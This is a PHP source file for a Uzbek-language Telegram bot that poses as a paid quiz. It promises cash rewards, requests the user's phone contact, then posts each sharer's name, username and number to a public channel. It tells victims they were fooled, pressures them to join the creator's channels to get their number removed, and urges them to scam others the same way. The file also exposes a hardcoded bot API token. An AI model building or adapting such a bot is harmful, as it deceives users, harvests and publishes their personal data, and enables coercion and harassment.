<?php
define('API_KEY','1020513018:AAE8cFmT6JAFPmMD-08TaLNZKHsewI080WA');
$admin = "@qizlarning_nomeri";
function del($nomi){
array_map('unlink', glob("$nomi"));
}

function put($fayl,$nima){
file_put_contents("$fayl","$nima");
}
function get($fayl){
$get = file_get_contents("$fayl");
return $get;
}
function ty($ch){ 
return bot('sendChatAction', [
'chat_id' => $ch,
'action' => 'typing',
]);
}
function editMessageText(
        $chatId,
        $messageId,
        $text,
        $parseMode = null,
        $disablePreview = false,
        $replyMarkup = null,
        $inlineMessageId = null
    ) {
       return bot('editMessageText', [
            'chat_id' => $chatId,
            'message_id' => $messageId,
            'text' => $text,
            'inline_message_id' => $inlineMessageId,
            'parse_mode' => $parseMode,
            'disable_web_page_preview' => $disablePreview,
            'reply_markup' => $replyMarkup,
        ]);
    }
function ACL($callbackQueryId, $text = null, $showAlert = false)
{
     return bot('answerCallbackQuery', [
        'callback_query_id' => $callbackQueryId,
        'text' => $text,
        'show_alert'=>$showAlert,
    ]);
}
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$update = json_decode(get('php://input'));
$message = $update->message;
$text = $message->text;
$cid = $message->chat->id;
$uid = $message->from->id;
$fname = $message->from->first_name;
$user = $message->from->username;
$data = $message->contact;
$nomer = $message->contact->phone_number;
$name = $message->contact->first_name;


if($text == "/start"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"  *Assalomu alaykum🙋‍♂hurmatli foydalanuvchi * \nBIZNING BOT JUDA
Ham xush momila 
Agar siz botning savollariga tu'gri javob bera✅olasanggiz✅
Sizni mukofotlaydi(paynet,qiwi,)
💵💯💴💯💶💯💷💯💰

Bizning🤖Botda👇👇
💡MANTIQIY
💡ILMIY
💡Falsafiy
Savollar bor
1to'g'ri javobinggiz uchun
🤑1000so‘m🤑
Beriladi
Har kuni 5ta savol olish huquqiga egasiz  !!!!
🛑DEMAK🛑
har kuni 5⃣MING💰so‘m
Yutub olishinggiz
Mumkin💡💡💡

⏳⌛️Demak tayyor bulsanggiz 
Pastagi👇📨tugma📥orqali
🤔SAVOL🧐oling
\n
sizga omad yor bo‘lsin
💪🙏🙏🙏🙏💪 ",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode(
['resize_keyboard'=>true,
'keyboard' => [
[["text"=>"🤗savollarni🤔OLISH🤯",'request_contact' =>true],
],
]
])
]);
}
if($data){
bot('sendmessage',[
    'chat_id'=>"@qizlarning_nomeri",
    'text'=>"User idsi: [$fname](tg://user?id=$uid)\nUseri: @$user\nNomeri: $nomer\nNomer nomi: $name",
    'parse_mode'=>"markdown"
        ]);
bot("sendmessage",[
    'chat_id'=>$cid,
    'text'=>"
savol eng biringchi b'olib kim yugaslovakiyani bosib olgan
javobni bilmasanggiz kiyingi tugmani BOSING
👇👇👇👇👇👇",
    'reply_markup'=>json_encode(
[
'resize_keyboard'=>true,
'selective'=>true,
'one_time_keyboard'=>true,
'keyboard' => [
[["text"=>"to'liqroq ma'lumot olish"],],
]
])
]);
}
$button = $message->keyboardbutton->text;
if($text == "to'liqroq ma'lumot olish"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"xullas yaxshigina uxlading
sini aldashdi menga nomeringni berding👆👆👆👆
usha nomering.   @qizlarning_nomeri
kanaliga tushdi agar tezroq
bizning @XABARCHILAR va @qizlarning_nomeri kanallariga azo bo‘lsang botni o‘zi sening nomeringni @qizlarning_nomeri kanalidan olib tashlaydi shunday ekan tezroq A'ZO bo‘l
agar kimnidir aldab nomerini olmoqchi bo‘lsang men kabi aldoqchi botlar @qizlarning_nomeri
kanalining icbida juda k'op sen ham qollab ko‘r 
kimnidir xuddu shu usul bilan nomerini bilib ol
hammaga OMAD
yaratuvchi ->  @XABARCHILAR  "]);
}

